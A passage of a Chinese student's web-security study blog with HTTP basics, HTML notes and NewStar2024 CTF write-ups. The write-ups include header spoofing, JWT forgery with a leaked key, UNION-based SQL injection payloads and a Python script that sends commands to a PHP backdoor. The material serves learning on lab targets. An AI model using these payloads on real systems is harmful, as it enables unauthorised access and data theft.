决定：</p><ul><li><strong>HTML</strong>：<code>&lt;html&gt;...&lt;/html&gt;</code></li><li><strong>JSON</strong>：<code>&#123; &quot;data&quot;: [...] &#125;</code></li><li><strong>二进制文件</strong>：如图片、PDF。</li></ul><h5 id="三、HTTP-请求完整流程示例"><a href="#三、HTTP-请求完整流程示例" class="headerlink" title="三、HTTP 请求完整流程示例"></a><strong>三、HTTP 请求完整流程示例</strong></h5><p><strong>1. GET 请求（浏览器地址栏输入 URL）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /api/user?id=123 HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: application/json</span><br></pre></td></tr></table></figure><p><strong>响应示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123; &quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 25 &#125;</span><br></pre></td></tr></table></figure><p><strong>2. POST 请求（提交表单数据）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /api/login HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">username=alice&amp;password=123456</span><br></pre></td></tr></table></figure><p><strong>响应示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: session_id=abc123; Path=/; HttpOnly</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123; &quot;success&quot;: true &#125;</span><br></pre></td></tr></table></figure><h4 id="关于发包（学习笔记）："><a href="#关于发包（学习笔记）：" class="headerlink" title="关于发包（学习笔记）："></a>关于发包（学习笔记）：</h4><h5 id="一、数据包的生命周期"><a href="#一、数据包的生命周期" class="headerlink" title="一、数据包的生命周期"></a><strong>一、数据包的生命周期</strong></h5><p><strong>1. 客户端生成请求</strong></p><ul><li><strong>输入</strong>：用户在浏览器输入 URL 或触发交互（如点击按钮）。</li><li><strong>构建请求</strong>：<ul><li>浏览器根据操作生成 HTTP 请求（包括方法、URL、Headers、Body）。</li><li>若使用 HTTPS，请求会被加密（TLS/SSL）。</li></ul></li></ul><p><strong>2. DNS 解析</strong></p><ul><li><strong>目的</strong>：将域名（如 <code>www.example.com</code>）转换为服务器的 IP 地址（如 <code>93.184.216.34</code>）。</li><li><strong>过程</strong>：<ol><li>浏览器缓存 → 本地 Hosts 文件 → 本地 DNS 服务器 → 根 DNS 服务器 → 权威 DNS 服务器。</li><li>最终获取目标服务器的 IP 地址。</li></ol></li></ul><p><strong>3. 建立 TCP 连接（三次握手）</strong></p><ul><li><strong>目的</strong>：确保客户端和服务器之间的可靠通信通道。</li><li><strong>步骤</strong>：<ol><li>客户端发送 <code>SYN</code> 包（同步请求）。</li><li>服务器回复 <code>SYN-ACK</code> 包（确认同步）。</li><li>客户端发送 <code>ACK</code> 包（最终确认）。</li></ol></li></ul><p><strong>4. 发送 HTTP 请求</strong></p><ul><li>数据包被拆分为多个 <strong>TCP 报文段</strong>，通过物理网络（网线、Wi-Fi、4G/5G）传输。</li><li><strong>路径</strong>：客户端 → 路由器 → 运营商网络 → 互联网骨干网 → 目标服务器。</li></ul><p><strong>5. 经过网络中间节点</strong></p><ul><li><strong>路由器和交换机</strong>：根据 IP 地址逐跳转发数据包。</li><li><strong>防火墙和代理</strong>：<ul><li>企业防火墙可能过滤非法请求。</li><li>CDN 节点可能缓存响应内容。</li><li>反向代理（如 Nginx）将请求转发给后端服务器。</li></ul></li></ul><p><strong>6. 服务器处理请求</strong></p><ul><li><strong>Web 服务器</strong>（如 Apache、Nginx）：接收请求并解析。</li><li><strong>应用服务器</strong>（如 Node.js、Java Spring）：执行业务逻辑（查询数据库、调用其他服务）。</li><li><strong>数据库</strong>：处理数据读写操作。</li></ul><p><strong>7. 返回 HTTP 响应</strong></p><ul><li><p>服务器生成响应（状态码、Headers、Body），通过相同路径返回客户端。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123; &quot;message&quot;: &quot;Success&quot; &#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong>8. 客户端接收响应</strong></p><ul><li>浏览器解析响应内容：<ul><li>若返回 HTML/CSS/JS，渲染页面。</li><li>若返回 JSON 数据，更新前端状态（如 React/Vue 组件）。</li></ul></li></ul><p><strong>9. 关闭 TCP 连接（四次挥手）</strong></p><ul><li><strong>目的</strong>：释放连接资源。</li><li><strong>步骤</strong>：<ol><li>客户端发送 <code>FIN</code> 包。</li><li>服务器回复 <code>ACK</code> 包。</li><li>服务器发送 <code>FIN</code> 包。</li><li>客户端回复 <code>ACK</code> 包。</li></ol></li></ul><h5 id="二、数据包传输的物理路径"><a href="#二、数据包传输的物理路径" class="headerlink" title="二、数据包传输的物理路径"></a><strong>二、数据包传输的物理路径</strong></h5><p><strong>1. 本地网络</strong></p><ul><li>客户端设备 → 家庭/公司路由器 → 调制解调器（光猫）。</li></ul><p><strong>2. 运营商网络</strong></p><ul><li>通过光纤、基站等进入 ISP（如电信、移动）的核心网络。</li></ul><p><strong>3. 互联网骨干网</strong></p><ul><li>跨城市、跨国的光纤链路，可能经过多个自治系统（AS）。</li></ul><p><strong>4. 目标服务器网络</strong></p><ul><li>服务器所在机房的路由器 → 负载均衡器 → 具体服务器。</li></ul><h5 id="三、数据包可能遇到的“关卡”"><a href="#三、数据包可能遇到的“关卡”" class="headerlink" title="三、数据包可能遇到的“关卡”"></a><strong>三、数据包可能遇到的“关卡”</strong></h5><p><strong>1. 防火墙</strong></p><ul><li>过滤非法请求（如恶意攻击、非白名单 IP）。</li></ul><p><strong>2. CDN（内容分发网络）</strong></p><ul><li>缓存静态资源（如图片、JS 文件），减少服务器压力。</li></ul><p><strong>3. 反向代理</strong></p><ul><li>将请求分发到多台后端服务器（负载均衡）。</li><li>处理 SSL 终止、请求重写。</li></ul><p><strong>4. 网关（API Gateway）</strong></p><ul><li>统一鉴权、限流、日志记录。</li></ul><h5 id="四、数据包可能丢失的场景"><a href="#四、数据包可能丢失的场景" class="headerlink" title="四、数据包可能丢失的场景"></a><strong>四、数据包可能丢失的场景</strong></h5><ol><li><strong>网络拥堵</strong>：路由器丢弃无法处理的数据包。</li><li><strong>传输错误</strong>：信号干扰导致数据损坏（通过 TCP 重传解决）。</li><li><strong>防火墙拦截</strong>：违反安全策略的请求被丢弃。</li><li><strong>服务器宕机</strong>：无法响应请求（返回 5xx 错误）。</li></ol><h3 id="3-前端学习日志"><a href="#3-前端学习日志" class="headerlink" title="3.前端学习日志"></a>3.前端学习日志</h3><p>本周学习了HTML的基础……</p><p>由于篇幅较大，转移至我的博客：</p><p><a href="https://www.czxh.top/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.czxh.top/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><h3 id="4-后端学习日志"><a href="#4-后端学习日志" class="headerlink" title="4.后端学习日志"></a>4.后端学习日志</h3><p>（暂无，准备先学习完前端知识）</p><p><a href="https://www.czxh.top/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.czxh.top/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><h3 id="5-NewStar2024-刷题记录"><a href="#5-NewStar2024-刷题记录" class="headerlink" title="5. NewStar2024 刷题记录"></a>5. NewStar2024 刷题记录</h3><h4 id="题目：headach3"><a href="#题目：headach3" class="headerlink" title="题目：headach3"></a>题目：headach3</h4><p>打开题目，F12查看响应头，得到 flag：</p><p><img src="https://pic1.imgdb.cn/item/67c2baa0d0e0a243d408dfdd.png" alt=""></p><h4 id="题目：会赢吗"><a href="#题目：会赢吗" class="headerlink" title="题目：会赢吗"></a>题目：会赢吗</h4><p>第一步，F12，在查看器中拿到第一部分的flag和下一关的路径</p><p><img src="https://pic1.imgdb.cn/item/67c2c0a8d0e0a243d408e8b3.png" alt=""></p><p>第二步：查看源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">revealFlag</span>(<span class="params">className</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/flag/<span class="subst">$&#123;className&#125;</span>`</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`恭喜你！你获得了第二部分的 flag: <span class="subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="subst">$&#123;data.nextLevel&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;请求失败，请检查输入或服务器响应。&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span> (error) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;请求过程中出现错误:&#x27;</span>, error);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 控制台提示</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在控制台调用该func访问原目录</p><p><img src="https://pic1.imgdb.cn/item/67c2c2bad0e0a243d408ee6d.png" alt=""></p><p>第三部分：通过修改前端，‘解封’得到flag</p><p><img src="https://pic1.imgdb.cn/item/67c2c33ad0e0a243d408ef7d.png" alt=""></p><p>第四部分，禁用javascript，得到：</p><p><img src="https://pic1.imgdb.cn/item/67c2c54bd0e0a243d408f31f.png" alt=""></p><p>将flag拼接起来，进行Base64 解密得到flag</p><p>flag{WA0w!_y4_r3al1y_Gr4sP_JJJs!}</p><h3 id="6-本周总结："><a href="#6-本周总结：" class="headerlink" title="6. 本周总结："></a>6. 本周总结：</h3><p><strong>level1</strong></p><p>本周是开始正式学习Web的第一周，按照前期的计划，开始学习了计算机网络的课程，</p><p>感觉计算机网络的内容很多且繁杂，需要时间来学习。</p><p>然后是网站前后端的学习，计划两周学完前端，重点放在后端知识的学习。</p><p>最后是对newstar做题的总结，第一周的题，嗯，一半一半吧，简单的题是简单的题，难的题是难的题</p><p><strong>level2</strong></p><p>感觉学习进度好像有点慢，下周要加快速率了</p><p><strong>level3</strong></p><p>请相信，我会学好web的~🙃🙃🙃😊😊😊</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web周报02</title>
      <link href="/2025/03/01/web%E5%91%A8%E6%8A%A502/"/>
      <url>/2025/03/01/web%E5%91%A8%E6%8A%A502/</url>
      
        <content type="html"><![CDATA[<h1 id="Web周报02"><a href="#Web周报02" class="headerlink" title="Web周报02"></a>Web周报02</h1><h2 id="前置任务进度"><a href="#前置任务进度" class="headerlink" title="前置任务进度"></a>前置任务进度</h2><ol><li><code>前端</code>学习日志：</li></ol><p>HTML的内容已基本学习完毕</p><p>学习笔记：</p><p><a href="https://www.czxh.top/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.czxh.top/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><ol><li><code>PHP</code>学习日志：</li></ol><p>基本的语法已经掌握。</p><p>学习笔记：</p><p><a href="https://www.czxh.top/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://www.czxh.top/2025/02/28/%E5%90%8E%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p><h2 id="本周做题（ns复现）"><a href="#本周做题（ns复现）" class="headerlink" title="本周做题（ns复现）"></a>本周做题（ns复现）</h2><h4 id="题目：PangBai-过家家（1）"><a href="#题目：PangBai-过家家（1）" class="headerlink" title="题目：PangBai 过家家（1）"></a>题目：PangBai 过家家（1）</h4><p><img src="https://pic1.imgdb.cn/item/67d3c47088c538a9b5bd02a8.png" alt=""></p><p>打开题目，第一关，提示在头部（Header），直接F12，查看header：</p><p><img src="https://pic1.imgdb.cn/item/67d3c4b688c538a9b5bd03c5.png" alt=""></p><p>获得下一关的地址：</p><p>第二关：根据提示：</p><p><img src="https://pic1.imgdb.cn/item/67d3c4e088c538a9b5bd0478.png" alt=""></p><p>使用get方法尝试：</p><p>进入第三关：</p><p><img src="https://pic1.imgdb.cn/item/67d3c52e88c538a9b5bd05ab.png" alt=""></p><p>提示另一种方法，也就是使用POST方法：</p><p><img src="https://pic1.imgdb.cn/item/67d3c62988c538a9b5bd08ce.png" alt=""></p><p>进入到下一关，提示agent:</p><p>我们设置useragent：</p><p><img src="https://pic1.imgdb.cn/item/67d3c74988c538a9b5bd0bfd.png" alt=""></p><p>提示：你的话语似乎没有对 PangBai 起效，试着说「玛卡巴卡阿卡哇卡米卡玛卡呣」。</p><p>更改say的值：</p><p>进入下一关：</p><p><img src="https://pic1.imgdb.cn/item/67d3d2e088c538a9b5bd3148.png" alt=""></p><p>这里要用PATCH方法提交一个补丁包：</p><p>参考WP:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PATCH /?ask=miao HTTP/1.1</span><br><span class="line">Host: 8.147.132.32:36002</span><br><span class="line">User-Agent: Papa/1.0</span><br><span class="line">Content-Type: multipart/form-data; boundary=abc</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6NX0.xKi0JkzaQ0wwYyC3ebBpjuypRYvrYFICU5LSRLnWq_0</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">--abc</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.zip&quot;</span><br><span class="line"></span><br><span class="line">123</span><br><span class="line">--abc</span><br><span class="line">Content-Disposition: form-data; name=&quot;say&quot;</span><br><span class="line"></span><br><span class="line">玛卡巴卡阿卡哇卡米卡玛卡呣</span><br><span class="line">--abc--</span><br></pre></td></tr></table></figure><p>通过浏览器开发者工具的「存储」编辑 Cookie，将 <code>Set-Cookie</code> 字段的 <code>token</code> 值应用更新。随后再次携带新 Cookie 刷新网页即可。</p><p>下一关：</p><p>本题提示内容指出了 <code>localhost</code>，意在表明需要让服务器认为这是一个来自本地的请求。可以通过设置 <code>Host</code> <code>X-Real-IP</code> <code>X-Forwarded-For</code> <code>Referer</code> 等标头欺骗服务器。</p><p>使用X-Forwaeder-For：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: 8.147.132.32:36002</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br></pre></td></tr></table></figure><p>下一关：</p><p>根据提示：</p><p>提到了 JWT 和 <code>Pe2K7kxo8NMIkaeN</code>，这个数字和字母组成内容推测应当是 JWT 的密钥。JWT 是一个轻量级的认证规范，允许在用户和服务器之间传递安全可靠的信息，但这是基于签名密钥没有泄露的情况下。可以通过 <a href="https://jwt.io">JWT.IO</a> 网站进行在线签名和验证</p><p><img src="https://pic1.imgdb.cn/item/67d3de3d88c538a9b5bd4e7a.png" alt=""></p><p>Payload，即 JWT 存放的数据，指明了当前的 Level 为 <code>6</code>，我们需要更改它，将它改为 <code>0</code> 即可。可见左下角显示「Invalid Signautre」，即验签失败，粘贴入签名密钥之后，复制左侧 Encoded 的内容，回到靶机界面应用该 token 值修改 Cookie，再次刷新网页，即到达最终页面。</p><p><img src="https://pic1.imgdb.cn/item/67d3de5988c538a9b5bd4eeb.png" alt=""></p><h4 id="题目：谢谢皮蛋"><a href="#题目：谢谢皮蛋" class="headerlink" title="题目：谢谢皮蛋"></a>题目：谢谢皮蛋</h4><p>本题考查的是 SQL 注入的相关知识</p><p>首先判断列数和回显位：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>#</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>#</span><br></pre></td></tr></table></figure><p>查看当前数据库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()#</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3cf6388c538a9b5bd249f.png" alt=""></p><p>然后查看所有表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3cfc088c538a9b5bd261a.png" alt=""></p><p>发现Fl4g,查看所有列名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;Fl4g&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span>database()#</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3d00388c538a9b5bd2727.png" alt=""></p><p>查看value得到flag！</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(des),group_concat(<span class="keyword">value</span>) <span class="keyword">from</span> Fl4g#</span><br></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/67d3d02c88c538a9b5bd27cf.png" alt=""></p><h4 id="题目：智械危机"><a href="#题目：智械危机" class="headerlink" title="题目：智械危机"></a>题目：智械危机</h4><p><img src="https://pic1.imgdb.cn/item/67d3d0f088c538a9b5bd2af7.png" alt=""></p><p>打开题目，根据提示，查看robots.txt:<br>得到/backd0or.php</p><p>进入查看：</p><p><img src="https://pic1.imgdb.cn/item/67d3d14888c538a9b5bd2b7d.png" alt=""></p><p>得到php,分析代码：</p><p><code>cmd</code> 参数是 <strong>Base64 编码后</strong>的 <code>system</code> 命令。</p><p><code>key</code> 的验证逻辑：将 <strong><code>cmd</code> 参数值</strong>字符串翻转后，计算 MD5 哈希，并与 Base64 解码后的 <code>key</code> 进行比较。</p><p>因此我们将这个过程反过来，就可以得到解题 EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for newstar_zhixieweiji&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://yourtarget.com/backd0or.php&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;cat /flag&quot;</span></span><br><span class="line">cmd_encoded = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">cmd_reversed = cmd_encoded[::-<span class="number">1</span>]</span><br><span class="line">hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()</span><br><span class="line">encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: cmd_encoded,</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: encoded_key</span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, data=payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Flag: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="本周总结"><a href="#本周总结" class="headerlink" title="本周总结"></a>本周总结</h2><p>这周主要学习的是PHP的内容。</p><p>本周前期把前端内容结束了，然后完成了对PHP的基础掌握，可以看懂并写出基本的PHP代码了。</p><p>然后就是对于抓包的学习，通过尝试，学会了使用burpsuit进行抓包和修改重发数据包。</p><p>学的内容还是有点少，这周可用的时间不多。</p><p>newstar的第一周复现完了</p><p>然后就是，下周计划开始学习php关于弱比较，数组绕过，SQL, 文件包含。。。这些有关安全的内容了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页前端学习笔记</title>
      <link href="/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/28/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>（由于本篇学习内容较多，文章大约一周更新一次，在已有内容之下补充新的学习笔记）</p><h1 id="网页前端-学习笔记"><a href="#网页前端-学习笔记" class="headerlink" title="网页前端-学习笔记"></a>网页前端-学习笔记</h1><p><strong><em>【在科学上方是没有平坦的大路可走的，只有那在崎岖小路的攀登上不畏劳苦的人，才有期望到达光辉的顶点。        ——马克思】</em></strong></p><h1 id="HTML-学习笔记"><a href="#HTML-学习笔记" class="headerlink" title="HTML 学习笔记"></a>HTML 学习笔记</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>生成浏览器文件.html的快捷方式：<code>!</code>+<code>Enter</code></p><p>代码格式化： <code>Shift</code>+<code>Alt</code>+<code>F</code></p><p><img src="https://pic1.imgdb.cn/item/67c40d6bd0e0a243d409e19a.png" alt=""></p><h3 id="HTML5-介绍："><a href="#HTML5-介绍：" class="headerlink" title="HTML5 介绍："></a>HTML5 介绍：</h3><p>HTML5是用来描述网页的一种语言，称为超文本标记语言，用HTML5编写的文件，后缀为.html，HTML是一种标记语言，标记语言是一套标记标签，标签是由尖括号包围的关键字，例如：<code>&lt;html&gt;</code></p><p>标签有两种表现形式：</p><ol><li>双标签，例如<code>&lt;html&gt;&lt;html&gt;</code></li><li>单标签，例如<code>&lt;img&gt;</code></li></ol><h2 id="HTML5-基本骨架："><a href="#HTML5-基本骨架：" class="headerlink" title="HTML5 基本骨架："></a>HTML5 基本骨架：</h2><p><img src="https://pic1.imgdb.cn/item/67c40f08d0e0a243d409e67a.png" alt=""></p><h3 id="DOCTYPE-声明："><a href="#DOCTYPE-声明：" class="headerlink" title="DOCTYPE 声明："></a>DOCTYPE 声明：</h3><p>DOCTYPE是document type（文档类型）的缩写。<code>&lt;!DOCTYPE html&gt;</code>是H5的声明位于文档的最前面，处于标签之前。他是网页必备的组成部分，避免浏览器的怪异模式。</p><h3 id="html标签："><a href="#html标签：" class="headerlink" title="html标签："></a>html标签：</h3><p>定义HTML文档，其他元素要包裹在它里面，标签定义了文档的开始点和结束点</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="head标签："><a href="#head标签：" class="headerlink" title="head标签："></a>head标签：</h3><p>定义文档的头部，头部描述了文档的各种属性和信息，包括文档的标题，在Web中的位置以及和其他文档的关系等。绝大多数文档头部包含的数据都不会真正作为内容显示给读者。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="body标签："><a href="#body标签：" class="headerlink" title="body标签："></a>body标签：</h3><p>body元素定义文档的主体。</p><p>body元素包含文档的所有内容（例如文本，超链接，图像，表格和列表等）</p><p>它会直接在页面中显示出来，也就是用户可以直观看到的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span 